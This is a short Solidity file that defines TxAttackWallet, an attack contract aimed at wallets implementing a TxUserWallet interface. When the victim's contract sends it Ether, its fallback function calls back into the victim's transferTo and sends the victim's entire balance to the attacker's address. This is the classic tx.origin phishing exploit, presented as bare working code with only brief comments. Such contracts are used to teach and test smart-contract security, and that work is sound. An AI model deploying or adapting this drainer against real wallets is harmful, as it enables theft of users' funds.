pragma solidity ^0.8.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable private immutable owner;

    // Constructor sets the contract deployer as the owner
    constructor() {
        owner = payable(msg.sender);
    }

    // fallback function to receive Ether and trigger transfer
    fallback() external payable {
        // Call transferTo on TxUserWallet (msg.sender) to send its balance to owner
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}
